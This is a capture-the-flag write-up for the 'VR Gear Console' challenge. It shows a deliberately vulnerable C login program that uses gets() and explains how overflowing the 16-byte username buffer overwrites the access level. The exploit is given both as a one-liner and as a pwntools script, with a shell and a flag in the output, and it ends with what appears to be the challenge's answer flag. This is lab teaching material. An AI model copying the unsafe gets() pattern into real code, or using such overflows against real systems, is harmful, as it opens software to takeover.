# VR Gear Console [ 95 Pts ]

## Problem

Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here: /problems/e9cab2bb993540454b19d3d56769d9e6

## Approach

```C
#include <stdlib.h>                                                          
#include <stdio.h>                                                           
                                                                             
int login() {                                                                
    int accessLevel = 0xff;                                                         
    char username[16];                                                       
    char password[32];                                                     
    printf("Username (max 15 characters): ");                                
    gets(username);                                                          
    printf("Password (max 31 characters): ");                                
    gets(password);                                                          
                                                                             
    if (!strcmp(username, "admin") && !strcmp(password, "{{ create_long_password() }}")) {                                                                
        accessLevel = 2;                                                     
    } else if (!strcmp(username, "root") && !strcmp(password, "{{ create_long_password() }}")) {                                                          
        accessLevel = 0;                                                     
    } else if (!strcmp(username, "artist") && !strcmp(password, "my-password-is-secret")) {                                                               
        accessLevel = 0x80;                                                  
    }                                                                        
                                                                             
    return accessLevel;                                                      
}                                                                            
                                                                             
int main(int argc, char **argv) {                                            
    setbuf(stdout, NULL);                                                    
    printf(                                                                  
        "+----------------------------------------+\n"                       
        "|                                        |\n"                       
        "|                                        |\n"                       
        "|                                        |\n"                       
        "|                                        |\n"                       
        "|  Welcome to the VR gear admin console  |\n"                       
        "|                                        |\n"                       
        "|                                        |\n"                       
        "|                                        |\n"                       
        "|                                        |\n"                       
        "+----------------------------------------+\n"                       
        "|                                        |\n"                       
        "|      Your account is not recognized    |\n"                       
        "|                                        |\n"                       
        "+----------------------------------------+\n"                       
        "\n\n\n\n"                                                           
        "Please login to continue...\n\n\n"                                  
    );                                                                       
    int access = login();                                                    
                                                                             
    printf("Your access level is: 0x%08x\n", access);                        
                                                                             
    if (access >= 0xff || access <= 0) {                                     
        printf("Login unsuccessful.\n");                                     
        exit(10);                                                            
    } else if (access < 0x30) {                                              
        printf("Admin access granted!\n");                                   
        printf("The flag is in \"flag.txt\".\n");                            
        system("/bin/sh");                                                   
    } else {                                                                 
        printf("Login successful.\n");                                       
        printf("You do not have permission to access this resource.\n");     
        exit(1);                                                             
    }                                                                        
}
```

From the source code, we need to change the access to a number between 0 and 0xff.
There is a buffer overflow vulnerability due to `gets()` function.

The accesslevel variable appears before the username variable. This means that it is located below the username variable in the stack.
The username variable has a size of 16.

Using GDB, we can infer the location of the variables [see how](../IveGotASecret_75/WRITEUP.md)

```
    int accessLevel = 0xff;                     //ebp-0xc
    char username[16];                          //ebp-0x1c
    char password[32];                          //ebp-0x3c
```

What this means is that the 17th byte will overwrite the accesslevel.

### Using Cat

```sh
$ python -c "print 16*'A' + '\x02' + '\naaa\n'" > payload

$ cat payload - | ./vrgearconsole 
+----------------------------------------+
|                                        |
|                                        |
|                                        |
|                                        |
|  Welcome to the VR gear admin console  |
|                                        |
|                                        |
|                                        |
|                                        |
+----------------------------------------+
|                                        |
|      Your account is not recognized    |
|                                        |
+----------------------------------------+




Please login to continue...


Username (max 15 characters): Password (max 31 characters): Your access level is: 0x00000002
Admin access granted!
The flag is in "flag.txt".
ls
flag.txt  payload  vrgearconsole  vrgearconsole.c  WRITEUP.md
cat flag.txt
FLAG{SampleFlag}
```

### Using pwntool

```python
from pwn import *

p = process('./vrgearconsole')

data = p.recvrepeat(0.5)
print data

username = 16*'A'+"\x02"
p.send(username + "\n")

data = p.recvrepeat(0.5)
print data

password = "blahblah"
p.send(password + "\n")

data = p.recvrepeat(0.5)
print data

p.interactive()

p.close()
```

Pwntool is more flexible and is much more useful when there are multiple I/O where the next input depends on the previous.

```
$ python vrgearbo.py 
[+] Starting local process './vrgearconsole': pid 17288
+----------------------------------------+
|                                        |
|                                        |
|                                        |
|                                        |
|  Welcome to the VR gear admin console  |
|                                        |
|                                        |
|                                        |
|                                        |
+----------------------------------------+
|                                        |
|      Your account is not recognized    |
|                                        |
+----------------------------------------+




Please login to continue...


Username (max 15 characters): 
Password (max 31 characters): 
Your access level is: 0x00000002
Admin access granted!
The flag is in "flag.txt".

[*] Switching to interactive mode
$ cat flag.txt
FLAG{SampleFlag}

```

The flag is da1e62f3da550878ed92d3d55d61fe7d

(Completed)
